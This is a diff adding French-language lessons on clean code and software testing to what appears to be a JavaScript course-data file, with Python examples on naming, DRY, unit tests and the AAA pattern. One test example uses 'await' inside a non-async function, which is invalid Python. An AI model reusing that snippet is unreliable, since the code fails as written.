+\`\`\`
+Entre HTTP classique et WebSocket :
+→ Le serveur peut envoyer des événements au client (unidirectionnel)
+→ Plus simple que WebSocket pour les cas où seul le serveur envoie
+
+Cas d'usage : streaming de réponses LLM (comme ChatGPT),
+notifications, mises à jour de statut en temps réel
+\`\`\``
+      }
+    ]
+  },
+  {
+    id: "bonnes-pratiques",
+    emoji: "⭐",
+    title: "Bonnes Pratiques Dev",
+    description: "Écrire du code maintenable, lisible et solide",
+    level: "Intermédiaire",
+    color: "#EC4899",
+    lessons: [
+      {
+        id: "clean-code",
+        title: "Code propre : les principes",
+        duration: "13 min",
+        content: `# Code propre
+
+Un code propre se lit comme de la prose : évident, sans surprise.
+
+## Nommage : la base de tout
+
+\`\`\`python
+# ❌ Mauvais
+def calc(a, b, t):
+    return a * b * (1 + t/100)
+
+x = calc(50, 3, 20)
+
+# ✅ Bon
+def calculer_prix_total(prix_unitaire, quantite, taux_tva_pourcent):
+    return prix_unitaire * quantite * (1 + taux_tva_pourcent / 100)
+
+prix_total = calculer_prix_total(prix_unitaire=50, quantite=3, taux_tva_pourcent=20)
+\`\`\`
+
+**Règles :**
+- Variables/fonctions : ce qu'elles **font** ou **contiennent**
+- Booléens : commence par \`is_\`, \`has_\`, \`can_\`
+- Pas d'abréviations cryptiques (\`usr\`, \`cnt\`, \`tmp\`)
+
+## Une fonction = une responsabilité
+
+\`\`\`python
+# ❌ Fonction qui fait tout
+def traiter_commande(commande):
+    # valide + calcule + envoie email + sauvegarde en DB
+    ...
+
+# ✅ Chaque fonction fait une chose
+def valider_commande(commande): ...
+def calculer_total_ttc(items): ...
+def confirmer_commande(commande, db, mailer):
+    valider_commande(commande)
+    total = calculer_total_ttc(commande.items)
+    db.save(commande)
+    mailer.envoyer_confirmation(commande.client_email, total)
+\`\`\`
+
+## Les commentaires : quand et comment
+
+\`\`\`python
+# ❌ Commenter ce qui est évident
+i += 1  # incrémente i de 1
+
+# ❌ Code mort commenté (supprime-le !)
+# ancienne_fonction()
+
+# ✅ Commenter le POURQUOI
+# Délai requis par l'API externe (rate limit 10 req/sec)
+time.sleep(0.1)
+
+# ✅ Expliquer la logique métier non évidente
+# La suppression d'une adresse principale nécessite
+# de désigner une autre adresse comme principale
+def supprimer_adresse(user, adresse): ...
+\`\`\`
+
+## DRY — Don't Repeat Yourself
+
+\`\`\`python
+# ❌ Code dupliqué
+def créer_admin(nom, email, mdp):
+    if not email or '@' not in email:  # dupliqué !
+        raise ValueError("Email invalide")
+    hashed = bcrypt.hash(mdp)          # dupliqué !
+    return Admin(...)
+
+def créer_user(nom, email, mdp):
+    if not email or '@' not in email:  # dupliqué !
+        raise ValueError("Email invalide")
+    hashed = bcrypt.hash(mdp)          # dupliqué !
+    return User(...)
+
+# ✅ Factoriser
+def valider_email(email):
+    if not email or '@' not in email:
+        raise ValueError("Email invalide")
+
+def créer_compte(nom, email, mdp, role='user'):
+    valider_email(email)
+    return Compte(nom=nom, email=email,
+                  password=bcrypt.hash(mdp), role=role)
+\`\`\``
+      },
+      {
+        id: "tests",
+        title: "Tester son code",
+        duration: "14 min",
+        content: `# Tester son code
+
+## Pourquoi tester ?
+
+\`\`\`
+Sans tests :                  Avec tests :
+────────────                  ────────────
+"Ça marchait hier..."         Déploie en confiance
+Peur de refactoriser          Refactorise librement
+Bugs découverts en prod       Bugs détectés avant la prod
+"Ça marche sur ma machine"    CI/CD vérifie sur tous les envs
+\`\`\`
+
+## La pyramide des tests
+
+\`\`\`
+       /\\
+      /E2E\\           Tests end-to-end (rare, lent)
+     /──────\\          Simule un vrai utilisateur (Playwright, Cypress)
+    /Intégra-\\
+   /  tion    \\       Tests d'intégration (modéré)
+  /────────────\\       Teste plusieurs composants ensemble
+ / Unitaires    \\     Tests unitaires (nombreux, rapides)
+/────────────────\\     Teste une fonction isolément
+\`\`\`
+
+## Tests unitaires
+
+\`\`\`python
+def calculer_remise(prix, pourcentage):
+    if pourcentage < 0 or pourcentage > 100:
+        raise ValueError("Remise invalide")
+    return prix * (1 - pourcentage / 100)
+
+# Tests
+def test_remise_normale():
+    assert calculer_remise(100, 20) == 80.0
+
+def test_remise_zero():
+    assert calculer_remise(50, 0) == 50.0
+
+def test_remise_totale():
+    assert calculer_remise(100, 100) == 0.0
+
+def test_remise_negative_leve_exception():
+    with pytest.raises(ValueError):
+        calculer_remise(100, -10)
+\`\`\`
+
+## Structure AAA
+
+\`\`\`python
+def test_créer_utilisateur(db_test):
+    # Arrange : prépare les données
+    email = "test@example.com"
+
+    # Act : exécute la fonction à tester
+    user = await UserService.créer(db_test, email=email, password="pass")
+
+    # Assert : vérifie le résultat
+    assert user.id is not None
+    assert user.email == email
+    assert user.hashed_password != "pass"  # bien hashé
+\`\`\`
+
+## Bonnes pratiques
+
+\`\`\`
+Quoi tester :
+✅ Les cas normaux (happy path)
+✅ Les cas limites (valeurs nulles, vides, extrêmes)
+✅ Les cas d'erreur (exceptions attendues)
+❌ Les getters/setters triviaux
+❌ Le code tiers (déjà testé par ses auteurs)
+
+Règles FIRST :
+Fast        : tests unitaires en millisecondes
+Isolated    : chaque test est indépendant
+Repeatable  : même résultat à chaque exécution
+Self-valid  : succès ou échec clair
+Timely      : écrit en même temps que le code
+\`\`\``
+      }
+    ]
   }
 ];
